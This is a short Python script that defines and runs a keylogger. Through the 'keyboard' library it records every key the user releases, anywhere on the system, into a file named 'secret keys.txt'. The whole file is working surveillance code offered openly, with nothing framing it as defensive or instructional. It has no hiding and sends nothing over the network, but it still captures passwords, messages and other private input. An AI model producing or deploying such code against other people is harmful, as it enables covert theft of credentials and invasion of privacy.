import keyboard

class keylogger:

    def __init__(self,log_filename):
        self.f = open(log_filename+".txt","w")
    
    def start_log(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self,event):
        button= event.name
        if button=="space":
            self.f.write(" ")
        elif button=="enter":
            self.f.write("\n")
        elif button=="shift+2":
            self.f.write('@')
        else:
            self.f.write(button)
        self.f.flush()


my_keylogger =keylogger("secret keys")
my_keylogger.start_log()